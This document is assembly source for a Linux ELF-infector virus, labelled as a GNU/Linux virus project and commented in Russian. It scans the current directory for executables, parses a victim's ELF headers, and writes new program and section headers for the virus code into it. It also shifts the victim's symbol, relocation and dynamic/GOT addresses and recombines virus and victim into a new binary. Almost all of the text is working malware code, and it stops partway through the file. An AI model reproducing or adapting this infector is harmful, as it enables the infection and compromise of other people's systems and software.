/// Example of ELF-infector (GNU/Linux virus project)
/// Copyright () Rigidus & 0xBECEDA 2020-2021
/// XREF: https://github.com/0xBECEDA/malware
/// LICENSE: Gnu Public Licence v.3

/// Compile:
///      gcc malware.s -nostdlib -o asm
/// или:
///      as malware.s -nostdlib -o asm.o
///      ld asm.o -o asm
/// также cmdstring для отладки макросов:
/// as -a malware.s -nostdlib -o asm
/// ключ -a позволяет увидеть генерацию макросов

/// TLDR & TOC:
/// - define C-constants
/// - macro declararations
/// - defuine .set-constants
/// - .text of pseudo-victim
/// - .data of pseudo-victim
/// - .text of infector
///   + _start_infector
///   + ...
///   + _test_file_infection
///   + ...
///   + _my_mmap
///   + _my_stat
///   + _openfile
///   + ...
///   + _canary
///   + STACK
///   + ...
///   + _my_write
///   + _error_msg
///   + _end_infector
///   + _fin_infector

/// Полезное или может пригодиться:
/// https://reverse.put.as/wp-content/uploads/2011/03/gdbreferencecard.html
/// https://cs.lmu.edu/~ray/notes/gasexamples/
/// https://stackoverflow.com/questions/14361248/whats-the-difference-of-section-and-segment-in-elf-file-format
/// http://tigcc.ticalc.org/doc/gnuasm.html#SEC39
/// https://www.opennet.ru/docs/RUS/gas/gas-4.html


    .text 0

    .global	_start
	.type	_start, @function

_start:
    leaq    _start_infector(%rip), %rsi
    jmp     *%rsi

/// Если эта переменная существует,
/// макросы будут генерировать отладочный вывод
    .set DEBUG_MODE, 1

/// CANARY
/// Мы хотим проверять, что стек не переполнен
/// Поэтому мы размещем значение-канарейку, которое
/// будет затерто если стек будет переполнен и
/// создаем макрос для проверки этого значения
#define CANARY_VAL 0xDEADBEEFBAADF00D

/// MACRO--------------------------------------

    // https://www.opennet.ru/docs/RUS/gas/gas-7.html#ss7.38
    // \@ хранит счетчик, содержащий число, которое
    // показывает, сколько раз был выполнен этот
    // макрос; вы можете вывести это число при
    // помощи \@, но только внутри определения макроса.

    .macro CHECK_CANARY
        .ifdef DEBUG_MODE
            mov     _canary(%rip), %rax
            mov    $CANARY_VAL, %rbx
            cmp    %rax, %rbx
            je      1f              # forward label 1
            lea     2f(%rip), %rsi  # forward label 2
            mov     $len_e_canary_\@, %rdx
            jmp     _error_msg
        2:
            .string "ERR: canary \@\n"
            .set len_e_canary_\@, . - 2b
        1:
        .endif
    .endm

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                // call    _my_write
                // xor     %rax, %rax
                // jmp     \name\()_exit
                jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm

    // Макрос для печати строки
    // NB!: давай макросы к макросам, а код - к коду

    .macro PRINT_STR name msg
        lea     \name\()_msg_print(%rip), %rsi
        mov     $len_e_\name, %rdx
        call    _my_write
        jmp     \name\()_end
    \name\()_msg_print:
        .ascii "\msg\()\n "
        .set len_e_\name, . - \name\()_msg_print
    \name\()_end:
    .endm

    // Конвертирует и печатает число, находящееся
    // по заданному адресу

    .macro CNVRT_NUM num_addr

        // BN: ты прав, очистка не нужна, код удален
        // растянули число на 16 байт
        lea     \num_addr\()(%rip), %rdx
        mov     (%rdx), %rdi
        call    cnvrt_addr_in_16_byte

        // сконвертировали число в ascii коды
        lea     byted_addr(%rip), %rsi
        call    cnvrt_num_to_hex_string

        // вывод числа
        lea     converted_addr(%rip), %rsi
        mov     $0x11, %rdx
        call    _my_write

        // вывод доп. перевода строки
        lea     newline(%rip), %rsi
        mov     $0x1, %rdx
        call    _my_write

    .endm



/// CONST--------------------------------------

    .set O_RDONLY, 0x0
    .set O_RDWR, 0x2
    .set MAP_PRIVATE, 0x2
    .set PROT_NONE, 0x0
    .set PROT_READ, 0x1
    .set PROT_WRITE, 0x2
    .set PROT_EXEC, 0x4
    .set PROT_READ_OR_PROT_WRITE, 0x3
    .set O_RDWR_AND_O_APPEND, 0x402
    .set ELF_E_ENTRY, 0x18
    .set ELF_E_PHOFF, 0x20
    .set ELF_E_SHOFF, 0x28
    .set ELF_E_PHNUM, 0x38
    .set ELF_E_SHNUM, 0x3c
    .set PHDR_P_OFFSET, 0x8
    .set PHDR_P_VADDR, 0x10
    .set PHDR_P_PADDR, 0x18
    .set PHDR_P_FILESZ, 0x20
    .set PHDR_P_MEMSZ, 0x28
    .set PHDR_P_ALLIGN, 0x30
    .set SHDR_SH_ADDR, 0x10
    .set SHDR_SH_TYPE, 0x4
    .set SHDR_SH_OFFSET, 0x18
    .set SHDR_SH_SIZE, 0x20
    .set DYNAMIC_REC_VADDR_OFFSET, 0x0
    .set DYNAMIC_REC_SZ_OFFSET, 0x8
    .set FIRST_SEGM_VADDR_OFFSET, 0x10
    .set LAST_SEGM_VADDR_OFFSET, 0x18
    .set VICTIM_CODE_SIZE_OFFSET, 0x20
    .set VICTIM_CODE_BEGIN_VADDR_OFFSET, 0x28
    .set ORIG_E_ENTRY_VADDR_OFFSET, 0x30
    .set FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY_OFFSET, 0x38
    .set OFFSET_TO_VICT_CODE_FRM_FILE_BEGIN, 0x40
    .set NEW_BIND_NOW_FLAG_RECORD_SIZE, 0x48

    // .macro ADDR_MASQUE reg
//     mov $0xF, \reg
// .endm

/// На случай если инфектор будет слинкован
/// с другими библиотеками, лучше сделать так,
/// чтобы его код был в отдельной подсекции -
/// так проще его извлекать.
///
/// Тогда основная подсекция будет содержать
/// код псевдо-жертвы:

/// CODE 0-------------------------------------
_start_victim:
    lea     _msg_victim(%rip), %rsi
    mov     $len_msg_victim, %rdx
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall

    lea    _exit_victim(%rip), %rsi
    jmp    *%rsi

// _exit_victim:
//     mov $0x3c, %rax
//     mov $0x0,  %rdi
//     syscall


/// DATA 0-------------------------------------
/// данные псевдо-жертвы
/// не обозначает как .data, потому что
/// в противном случае, по неизвестной мне причине,
/// и при сработавшем mprotect, если использовать директиву
/// .data, то любой call вируса после заражения оборачивается
/// сегфолтом
_msg_victim:
    .ascii "Hello, I am victim\n"
    .set len_msg_victim, . - _msg_victim

_msg_infection_success:
    .ascii " is successfully infected \n"
    .set len_msg_infection_success, . - _msg_infection_success

_msg_cur_infection:
    .ascii " file: infection try \n"

fd:
    .quad 0

dir_name:
    .string "./"

dir_buf:
    .space 8000, 0

dir_struct:
    .space 30, 0

dir_buf_ptr:
    .quad 0

file_name_ptr:
    .quad 0

file_name_len:
    .quad 0

victim_elf_addr:
	.quad 0

victim_phdr_table_addr:
	.quad 0

victim_phdr_table_size:
	.quad 0

victim_phdr_amount:
	.quad 0

victim_shdr_table_addr:
	.quad 0

victim_shdr_table_size:
	.quad 0

victim_shdr_amount:
    .quad 0

virus_new_vaddr:
    .quad 0

virus_new_phdr:
    .space 0x38, 0

virus_new_shdr:
    .space 0x40, 0

last_seg_vaddr:
    .quad 0

last_seg_allign:
    .quad 0

victim_code_size:
    .quad 0

victim_code_addr:
    .quad 0

victim_code_frm_begin_vaddr:
    .quad 0

victim_code_offset:
    .quad 0

victim_code_before_bind_now_size:
	.quad 0

victim_code_after_bind_now_size:
	.quad 0

victim_code_before_bind_now_addr:
	.quad 0

victim_code_after_bind_now_addr:
	.quad 0

virus_code_addr:
	.quad 0

virus_code_size:
	.quad 0

symtab_shdr_addr:
	.quad 0

symtab_records_amount:
	.quad 0

dynamic_records_offset:
	.quad 0

dynamic_records_size:
	.quad 0

dynamic_records_vaddr:
    .quad 0

dynamic_records_amount:
	.quad 0

bind_now_record_exist:
	.quad 0

new_bind_now_record_exist:
	.quad 0

new_bind_now_record_frm_dynamic_offset:
	.quad 0

original_e_entry:
	.quad 0

offset_to_e_entry:
	.quad 0

move_victim_offset:
    .quad 0

offset_to_e_entry_frm_file_begin:
	.quad 0

frm_orig_e_entry_to_virus_e_entry_offset:
    .quad 0

offset_to_vict_code_frm_file_begin:
    .quad 0

sh_name_indx:
    .long 0

first_seg_vaddr:
	.quad 0

first_seg_addr:
	.quad 0

GOT_vaddr:
	.quad 0

_canary:
    .quad CANARY_VAL

_stack_top:
    .space 6000, 0

_stack_bottom:
    .quad 0

_file_name3:
    // .string  "victim"
    // .string  "example"
    // .string  "misha_example"
    // .string  "example.txt"

_victim_nolibs_filenm:
    .string  "victim"

virus_file_name:
    .string  "asm"

small_virus_file_name:
    .string  "virus"

new_elf_file:
    .string "test_inf"

newline:
    .ascii "\n"
byted_addr:
    .space  16, 0

/// CODE 1-------------------------------------
/// Подсекция кода инфектора
    .text 1

/// INTENT:
/// ~~~~~~
/// Мы хотим разрешить самомодифицирующийся код.
/// Для этого мы должны передать MPROTECT выровненный
/// адрес - т.е. кратный размеру страницы (в моей архитектуре это 4 кб)
/// Этот адрес должен быть выше адреса _start_infector.
/// Он совпадает с адресом начала сегмента кода,
/// но мы не можем быть в этом уверены, когда находимся
/// в зараженном файле.

 	.global	_start_infector
	.type	_start_infector, @function
_start_infector:

    // -=:[ Разрешаем писать себе в код ]:=-

    // перед этим сохраняем регистры
    // RDX, RCX, RDI
    // в этих регистраз содержатся адреса,
    // положенные загрузчиком/линкером, если их затереть
    // особенно RDX, то libc не сможет корректно стартануть
    // жертву и/или завершить ее
    // Если посмотреть info regs под gdb, то видно, что в
    // R9, R14 и R15 нули, так что сохраним адреса в них,
    // а после вызова mprotect вернем исходное состояние регистров

    mov     %rdx, %r9
    mov     %rcx, %r14
    mov     %rdi, %r15

    lea     _start(%rip), %rdi
    and     $~0xFFF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr

    sub     %rdi, %rsi          # total size - %RSI
    // CALL MPROTECT            # start addr - %RDI
    mov     $0x7, %rdx            # RW+EXEC flags - $RDX
    mov     $0xA, %rax            # mprotect handle
    syscall

    mov     %r9, %rdx
    mov     %r14, %rcx
    mov     %r15, %rdi

    xor     %r9, %r9
    xor     %r14, %r14
    xor     %r15, %r15

    test    %rax, %rax
    jz      _mprotect_is_ok
    // ------------------------ #
    ERR_MSG mprotect "mprotect in _start"

old_rsp:
    .quad 0     # вершина стека жертвы

old_rax:
    .quad 0

old_rbx:
    .quad 0

old_rdx:
    .quad 0

old_rcx:
    .quad 0

old_rdi:
    .quad 0

old_rsi:
    .quad 0

old_r8:
    .quad 0

old_r9:
    .quad 0

old_r10:
    .quad 0

old_r11:
    .quad 0

old_r12:
    .quad 0

old_r13:
    .quad 0

old_r14:
    .quad 0

old_r15:
    .quad 0

    // ------------------------ #
_mprotect_is_ok:
    // Set Stack
    mov     %rsp, old_rsp(%rip)     # save old %RSP
    lea     _stack_bottom(%rip), %rsp

    mov     %rax, old_rax(%rip)
    mov     %rbx, old_rbx(%rip)
    mov     %rdx, old_rdx(%rip)
    mov     %rcx, old_rcx(%rip)
    mov     %rdi, old_rdi(%rip)
    mov     %r8, old_r8(%rip)
    mov     %r9, old_r9(%rip)
    mov     %r10, old_r10(%rip)
    mov     %r11, old_r11(%rip)
    mov     %r12, old_r12(%rip)
    mov     %r13, old_r13(%rip)
    mov     %r14, old_r14(%rip)
    mov     %r15, old_r15(%rip)

    // -=:[ Разбор файла жертвы ]:=-
    // NB!: Перенес test_file_infection cюда


    // очищаем данные о записи BIND_NOW
    // на случай, если эти переменные сохранили
    // значения из прошлых заражений
    // А нам не надо, чтоб они влияли на текущее
    // зараения
    leaq    new_bind_now_flag_record_size(%rip), %rdx
    movq    $0, (%rdx)

    leaq    bind_now_record_exist(%rip), %rdx
    movq    $0, (%rdx)

    leaq    new_bind_now_record_exist(%rip), %rdx
    movq    $0, (%rdx)

    // очищаем данные о секции dynamic по
    // той же причине
    leaq    dynamic_records_offset(%rip), %rdx
    movq    $0, (%rdx)

    leaq    dynamic_records_size(%rip), %rdx
    movq    $0, (%rdx)

    leaq    dynamic_records_vaddr(%rip), %rdx
    movq    $0, (%rdx)

    leaq    dynamic_records_amount(%rip), %rdx
    movq    $0, (%rdx)

    call     _my_readdir
    // получить данные жертвы
    call    _get_victim_data
    // получить данные вируса
    call    _get_virus_code
    // найти точку для заражения
    call    _find_point_for_infection
    // отредактировать поля заголовков
    call    _recount
    // записать код вируса и жертвы в новый эльф
    call    _recombine_elf

_canary_test:
    CHECK_CANARY
    jmp     _end_infector

/// _MY_READDIR
/// PARAMS
/// Открывает каталог и чистает все записи из
/// него в буфер
_my_readdir:

    push    %rdi
    push    %rsi
    push    %rax
    push    %rbx

    // открыть директорию
    lea     dir_name(%rip), %rdi
    mov     $0x0, %rsi
    mov     $0x2, %rax  # fopen syscall
    syscall

    test     %rax, %rax
    jl      _my_readdir_open_error

    // заполянем структуру потока
    lea     dir_struct(%rip), %rbx
    mov     %eax, (%rbx)
    movq    $0x8000, 0x8(%rbx) # размер буфера

    mov    (%rbx), %rdi
    lea    dir_buf(%rip), %rsi
    mov    8(%rbx), %rdx

    // вызов getdents
    mov    $0x4e, %rax
    syscall

    // в случае успеха возвращ.
    // кол-во считанных байт
    // иначе 0
    cmp     $0x0, %rax
    jle     _my_readdir_read_error

    // сохранили указатель на первую структуру
    // в буфере
    lea    dir_buf_ptr(%rip), %rbx
    mov    %rsi, (%rbx)

    pop    %rbx
    pop    %rax
    pop    %rsi
    pop    %rdi

    ret

    ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
    ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"

/// _GET_FILE_NAME
/// PARAMS -no
/// Получает указатель на имя файла
/// из структуры
/// на которую указывает  dir_buf_ptr
/// Знач. возвращ. в RAX
_get_file_name:
    push    %rbx
    push    %rcx

    mov     dir_buf_ptr(%rip), %rbx
    // получили имя
    lea     0x12(%rbx), %rax

    xor     %rcx, %rcx
    // получили размер текущей структуры
    // (он меняется)
    movzwl  0x10(%rbx), %ecx
    // сдвинули указатель на
    // следующую структуру
    add     %rcx, %rbx

    lea     dir_buf_ptr(%rip), %rcx
    mov     %rbx, (%rcx)

    pop     %rcx
    pop     %rbx

    ret

// _FIND_VICTIM_TEXT_SECTION
// PARAMS
// - %RDI - shdr addr table
// - %RSI - shdr amount
// - %RDX - e_entry
//
// находит секцию text для заражения -
// этот сегмент содержит e_entry
//
// Как понять, что сегмент содержит e_entry:
// его sh_addr <= e_entry,
// его sh_addr + sh_size > e_entry
/// Этот заголовко секции  нужен, чтоб прочитать его sh_name -
/// индекс в таблице строк, его же присвоим новому заголовку
/// секции вируса

    .globl  _find_victim_text_section
	.type	_find_victim_text_section, @function
_find_victim_text_section:
    push    %rbx
    push    %rcx
    push    %rax

    mov     %rsi, %rcx

_find_victim_text_section_cycle:
    mov     %rdi, %rax

    mov     SHDR_SH_ADDR(%rdi), %rbx     # получаем поле sh_addr

    cmp     %rdx, %rbx  # addr долен быть <= e_entry
    // иначе переход на следующую итерацию
    jg      _next_iter_find_text

    mov    %rax, %rdi
    mov    SHDR_SH_SIZE(%rdi), %rsi # размер текущего секц.

    add    %rsi, %rbx   # адрес конца текущeго сегмент

    cmp    %rdx, %rbx   # cur sect. end > e_entry
    jl     _next_iter_find_text

    jmp    _find_text_success   # section is found
_next_iter_find_text:

    add     $0x40, %rax
    mov     %rax, %rdi

    loop    _find_victim_text_section_cycle
    jmp     _find_text_section_error # noting is fund

_find_text_success:
    leaq    sh_name_indx(%rip), %rcx
    movl    (%rax), %edx
    movl    %edx, (%rcx)  # save sect. sh_name

_find_text_exit:
    pop     %rax
    pop     %rcx
    pop     %rbx

    ret

    ERR_MSG _find_text_section "_find_text_sect.: No text section found"

// _FIND_FIRST_SEG_VADDR
/// PARAMS
/// RDI -  указатель на заголовки,
/// RSI -  их количество
/// Ищет виртуальный адрес первого загружаемого
/// сегмента кода
_find_first_seg_vaddr:
    push    %rcx
    push    %r8
    push    %rax

    mov     %rdi, %r8
    mov     %rsi, %rcx        # установили счетчик цикла
_find_first_seg_vaddr_cycle:
    cmp     $1, (%rdi)
    jne     _find_first_seg_vaddr_next

    cmp     $1, (%r8)
    jne     _set_first_seg

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jl      _set_last_seg
    jmp     _find_first_seg_vaddr_next

_set_first_seg:
    mov     %rdi, %r8

_find_first_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_first_seg_vaddr_cycle

_find_first_seg_vaddr_success:
    leaq    first_seg_vaddr(%rip), %rsi
    mov     PHDR_P_VADDR(%r8), %rdi
    mov     %rdi, (%rsi)

    leaq    first_seg_addr(%rip), %rsi
    mov     %r8, (%rsi)

_find_first_seg_vaddr_exit:
    pop     %rax
    pop     %r8
    pop     %rcx

    ret

    ERR_MSG _find_first_seg_vaddr "_find_first_seg_vaddr: No segment found"

/// _FIND_FIRST_SEG_VADDR
/// PARAMS
/// RDI - orig e_entry жертвы
/// Выравнивает e_entry жертвы на 4 кб,
/// получая таким образом адрес, с которого
/// начинается эльф (эльф всегда будет
/// начинаться сначала стрницы памяти
// _find_first_seg_vaddr:
//     push     %rax

//     and     $~0xFFF, %rdi
//     leaq    first_seg_vaddr(%rip), %rsi
//     mov     %rdi, (%rsi)

//     pop      %rax
//     ret

/// _FIND_LAST_SEG_VADDR
/// PARAMS
/// RDI -  указатель на заголовки,
/// RSI -  их количество
/// Ищет виртуальный адрес первого сегмента кода
/// - у него будет 0 смещение
_find_last_seg_vaddr:
    push    %rcx
    push    %r8
    push    %rax

    mov     %rdi, %r8
    mov     %rsi, %rcx        # установили счетчик цикла
_find_last_seg_vaddr_cycle:

    cmp     $1, (%rdi)
    jne     _find_last_seg_vaddr_next

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jg      _set_last_seg
    jmp     _find_last_seg_vaddr_next

_set_last_seg:
    mov     %rdi, %r8

_find_last_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_last_seg_vaddr_cycle

_find_last_seg_vaddr_success:
    leaq    last_seg_vaddr(%rip), %rsi

    mov     PHDR_P_VADDR(%r8), %rax
    mov     PHDR_P_ALLIGN(%r8), %rcx

    mov     %rax, (%rsi)
    leaq    last_seg_allign(%rip), %rsi
    mov     %rcx, (%rsi)

_find_last_seg_vaddr_exit:
    pop     %rax
    pop     %r8
    pop     %rcx
    ret

/// _MAKE_VIRUS_NEW_VADDR
/// PARAMS - no
/// Считает виртуальный адрес вируса внутри
/// инфицированной жертвы
/// Адрес считается как
/// vaddr последнего загружаемого сегмента кода жертвы +
/// ее выравнивание + смещение до кода вируса в файле
_count_virus_new_vaddr:
    push    %rax
    push    %rbx

    mov     last_seg_vaddr(%rip), %rax
    and     $~0xFFF, %rax

    mov    	last_seg_allign(%rip), %rbx
	add     %rbx, %rax

	mov     victim_elf_addr(%rip), %rbx
	mov     ELF_E_SHOFF(%rbx), %rbx
	add     $0x38, %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
	add     %rbx, %rax

	leaq    virus_new_vaddr(%rip), %rbx

    mov     %rax, (%rbx)
	pop     %rbx
	pop     %rax

    ret

/// _GENERATE_BIND__NOW_FLAG_RECORD
/// Создает запись для флага BIND_NOW
bind_now_flag_record:
    .space 0x10, 0

flag_1_flag_record:
    .space 0x10, 0

/// по умолчанию ноль - если запись так
/// и не будет сгенерирована, то это значение
/// так и останется, в противном случае оно будет
/// изменено на 0х10
new_bind_now_flag_record_size:
    .quad 0

_generate_bind_now_flag_record:
    push    %rax

    leaq    bind_now_flag_record(%rip), %rax
    movb    $0x18, (%rax)
    pop     %rax
    ret

_generate_flags_1_flag_record:
    push    %rax

    leaq    bind_now_flag_record(%rip), %rax
    movq    $0x6fffffb, (%rax)
    add     $0x8, %rax
    movb    $0x1, (%rax)
    pop     %rax
    ret


/// _GENERATE_VIRUS_PHDR
/// генерирует заголовок сегмента для кода вируса
/// PARAMS - no
_generate_virus_phdr:
    push    %rbx
    push    %rax
    push    %rcx

    leaq    virus_new_phdr(%rip), %rax

    movb    $0x1, (%rax) # p_type
    add     $0x4, %rax

    movb    $0x5, (%rax) # p_flags
    add     $0x4, %rax

    mov     victim_elf_addr(%rip), %rbx
    mov     ELF_E_SHOFF(%rbx), %rbx
    add     $0x38, %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
    movq    %rbx, (%rax) # p_offset
    add     $0x8, %rax

    mov     virus_new_vaddr(%rip),%rbx
    movq    %rbx, (%rax) # vaddr
    add     $0x8, %rax

    movq    %rbx, (%rax) # paddr
    add     $0x8, %rax

    mov     virus_code_size(%rip), %rbx
    movq    %rbx, (%rax) # p_filesz

    // к размеру кода добавили блок данных жертвы
    mov     data_size(%rip), %rcx
    add     %rcx, (%rax)

    add     $0x8, %rax

    movq    %rbx, (%rax) # p_memsz
    add     %rcx, (%rax)

    add     $0x8, %rax

    # поле p_allign при инициализации
    # заполнено нулями, что и нужно

    pop     %rcx
    pop     %rax
    pop     %rbx
    ret

    // 6015b0
/// _GENERATE_VIRUS_SHDR
/// генерирует заголовок секции для кода вируса
/// PARAMS - no
_generate_virus_shdr:
    push    %rbx
    push    %rax

    leaq    virus_new_shdr(%rip), %rax
    leaq    sh_name_indx(%rip), %rbx

    movl    (%rbx), %ebx  # sh_name
    movl    %ebx,  (%rax)
    add     $0x4, %rax

    movb    $0x1, (%rax)  # sh_type
    add     $0x4, %rax

    movb    $0x6, (%rax)  # sh_flags
    add     $0x8, %rax

    mov     virus_new_vaddr(%rip), %rbx
    mov     %rbx, (%rax)  # sh_addr
    add     $0x8, %rax

    mov     victim_elf_addr(%rip), %rbx
    mov     ELF_E_SHOFF(%rbx), %rbx
    add     $0x38, %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
    mov     %rbx, (%rax)  # sh_offset
    add     $0x8, %rax

    mov     virus_code_size(%rip), %rbx

    mov     data_size(%rip), %rcx

    mov     %rbx, (%rax) # sh_size
    add     %rcx, (%rax)

    add     $0x8, %rax

    # поля sh_link, sh_info, sh_addralign, sh_entsize
    # при инициализации записаны нулями,
    # а нам и нужно чтоб они были
    # заполнены нулями

    pop     %rax
    pop     %rbx

    ret

// FIND_SYMTAB_CODE
// Ищет среди всех заголовков секций заголовк symtab - этот заголовок описывает
// таблицу символов. Ищем по типу заголовка - у symtab этот тип 2, symtab может быть
// в файле в единственном числе
// PARAMS:
// RDI - указатель нa таблицу заголвоков секций
// RSI - количество заголовков
_find_symtab:
    push    %rcx
    push    %rdx

    mov     %rsi, %rcx
_find_symtab_cycle:
    mov     %rdi, %rsi
    mov     SHDR_SH_TYPE(%rdi), %rdx

    cmp     $0x2, %rdx   # shdr = symtab?
    je      _find_symtab_success

    add     $0x40, %rsi
    mov     %rsi, %rdi
    loop    _find_symtab_cycle

_find_symtab_success:
    leaq    symtab_shdr_addr(%rip), %rdi
    mov     %rsi,  (%rdi)

    // считаем кол-во записией в symtab
    // symtab size / symtab record size = rec. amount
    mov      SHDR_SH_SIZE(%rsi), %rdx
    mov      $0x18, %ecx
    movl     %edx, %eax
    xor      %rdx, %rdx
    idivl    %ecx

    leaq    symtab_records_amount(%rip), %rdi
    mov     %rax, (%rdi)

_find_symtab_fail:
    pop     %rdx
    pop     %rcx

    ret

/// _RECOUNT_SYMBOLS_ADDRS
/// Редактирует vaddr символов
/// PARAMS:
/// RDI - указатель на заголовок symtabs
/// RSI - количество записей в symtab
/// RDX - константа, на которую увеличивается
/// vaddr
_recount_symbols_addrs:
    push    %rcx
    push    %rax
    push    %rbx
    push    %r8

    test    %rdi, %rdi
    je      _recount_symbols_addrs_exit
    mov     %rsi, %rcx

    mov     dynamic_records_vaddr(%rip), %r8
    mov     new_bind_now_flag_record_size(%rip), %rbx

    // указатель на первую запись в symtab
    //
    mov     victim_elf_addr(%rip), %rsi
    add     $0x18, %rdi
    add     (%rdi), %rsi
    mov     %rsi, %rdi

_recount_symbols_addrs_cycle:
    add     $0x8, %rdi   # offset до vaddr символа

    cmp     $0, (%rdi)
    je      _recount_symbols_next_iter

    cmp     %r8, (%rdi)
    jle     _add_const_symtab

    add     %rbx, (%rdi)  # сместили на разм. +1 dyn. record

_add_const_symtab:
    add     %rdx, (%rdi)  # сместили на разм. virus phdr

_recount_symbols_next_iter:
    add     $0x10, %rdi
    loop    _recount_symbols_addrs_cycle

_recount_symbols_addrs_exit:
    pop     %r8
    pop     %rbx
    pop     %rax
    pop     %rcx
    ret

/// _RECOUNT_RELA_SECTION
/// увеличивает vaddr релокейта на заданную величину
/// RDI - offset до секции rela
/// RSI - значение, на которое увеличивается vaddr
/// RDX - размер секции rela
_recount_rela_section:
    push    %rax
    push    %rbx
    push    %rcx
    push    %r8

    // посчитали кол-во записей
    // в секции rela
    mov     %edx, %eax
    xor     %rdx, %rdx
    mov     $0x18, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    //  получили адрес кода секции в памяти
    mov     victim_elf_addr(%rip), %rax
    add     %rdi, %rax

    mov     new_bind_now_flag_record_size(%rip), %rbx
    mov     dynamic_records_vaddr(%rip), %r8

_recount_rela_section_cycle:
    cmp     $0, (%rax)
    je      _recount_rela_next_iter

    cmp     %r8, (%rax)
    jle     _add_const_to_rela

    // vaddr релокейта + размер новой записи
    // dynamic
    add     %rbx, (%rax)

    // vaddr релокейта + константа
_add_const_to_rela:
    add     %rsi, (%rax)

_recount_rela_next_iter:
    add     $0x18, %rax   # сдвиг на след. запись
    loop    _recount_rela_section_cycle

_recount_rela_section_exit:
    pop     %r8
    pop     %rcx
    pop     %rbx
    pop     %rax

    ret

/// _RECOUNT_DYNAMIC_SECTION
/// редактирует vaddr кода, описываемого записями в dynamic,
/// а так же находит запись GOT и сохраняет ее измененный vaddr
/// RDI - адрес секции dynamic
/// RSI - константа, на которую увеличится vaddr
/// во всех записях dynamic
/// RDX - размер секции dynamic
/// RCX - базовый виртуальный адрес эльфа
_recount_dynamic_section:
    push    %rax
    push    %rbx
    push    %r8
    push    %r9

    mov     %rcx, %r8
    mov     new_bind_now_flag_record_size(%rip), %rbx
    mov     dynamic_records_vaddr(%rip), %r9

    cmp     $0, %rdi
    je      _recount_dynamic_section_exit

    mov     %edx, %eax
    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    mov     %r8, %rdx
    mov     %rdi, %rax

_recount_dynamic_section_cycle:
    // запись о сеции GOT?
    cmpl    $0x3, (%rax)
    je     _save_got_vaddr

    // запись FLAGS_1?
    cmpq    $0x6ffffffb, (%rax)
    jne     _recount_vaddr
    jmp     _skip_record

_skip_record:
    add     $0x8, %rax
    jmp     _recount_dynamic_section_next_iter
    // редактируем и сохраняем vaddr GOT
    // она всегда будет после секции dynamic,
    // а следовательно, сместится, если dynamic
    // расширится
_save_got_vaddr:
    add     $0x8, %rax  # пропустили тип

    leaq    GOT_vaddr(%rip), %rdi

    add     %rsi, (%rax)
    add     %rbx, (%rax)

    push    %rax

    mov     (%rax), %rax
    mov     %rax, (%rdi)

    pop     %rax

    jmp    _recount_dynamic_section_next_iter
    // пересчитываем адрес релокейта,
    // если он не нулевой
_recount_vaddr:
    add     $0x8, %rax  # пропустили тип

    cmp     %rdx,  (%rax)
    jle     _recount_dynamic_section_next_iter

    // код лежит после секции dynamic?
    cmp     %r9,  (%rax)
    jle     _add_const

    add     %rbx, (%rax)

_add_const:
    // vaddr релокейта + константа
    add     %rsi, (%rax)

_recount_dynamic_section_next_iter:
    add     $0x8, %rax    # сдвиг на след. запись
    loop    _recount_dynamic_section_cycle

_recount_dynamic_section_exit:
    pop     %r9
    pop     %rcx
    pop     %rbx
    pop     %rax
    ret

///  _EDIT_GOT_RECORDS
/// подготоавливает параметры и вызывает
/// редактирование записей GOT
/// Поскольку редактирование GOT происходит
/// после редактирования shdrs, то нужно помнить,
/// что в оригинальном файле смещение и адрес будут
/// меньше на 56 байт
/// PARAMS
/// RDI - указатель на таблицу shdrs
/// RSI - количество shdrs
/// RDX - виртуальный адрес GOT
_edit_got_records:
    push    %rcx
    mov     %rsi, %rcx

_edit_got_records_cycle:
    add     $0x10, %rdi

    cmp     %rdx, (%rdi)
    je      _edit_got_records_success
    jmp     _edit_got_records_next

_edit_got_records_next:
    add      $0x30, %rdi
    loop    _edit_got_records_cycle

    jmp     _edit_got_records_error
_edit_got_records_success:
    add     $0x8, %rdi # sh_offset
    mov     (%rdi), %rcx
    sub     $0x38, %rcx

    add     $0x8, %rdi  # sh_size
    mov     (%rdi), %rdx

    mov     %rcx, %rdi
    mov     $0x38, %rsi

    call    _recount_got_section
_edit_got_records_exit:
    pop    %rcx
    ret

    ERR_MSG   _edit_got_records "edit_got_records: No such GOT vaddr"

/// _GET_VIRUS_CODE
/// @PARAMS - no
///
/// Читает указатель начала кода вируса и размер этого
/// кода.
/// Записывает адрес кода вируса в virus_code_addr и
/// размер этого кода в virus_code_size
/// NB!: Есть мнение, что достаточно найти
/// сигнатуру начала вируса а длину мы можем
/// вычислить на стадии компиляции. Это можно сделать
/// прямо в памяти, без открытия файла. А если мы это
/// делаем в памяти, то мы из любой точки можем
/// посчитать относительное расстояние до метки
/// _infector_start, так что даже и без сигнатуры можно
/// обойтись.
_get_virus_code:

    leaq    _start(%rip), %rdi  # начало вируса
    leaq    virus_code_addr(%rip), %rsi
    mov     %rdi, (%rsi)

    leaq    _exit_victim(%rip), %rsi
    sub     %rdi, %rsi  # virus size до exit_victim

    # exit + размер блока передачи управления
    mov     transfer_control_code_size(%rip), %rax
    add     %rax, %rsi

    leaq    virus_code_size(%rip), %rdi
    mov     %rsi, (%rdi)

    ret

/// _CHECK_FILE_INFECTION
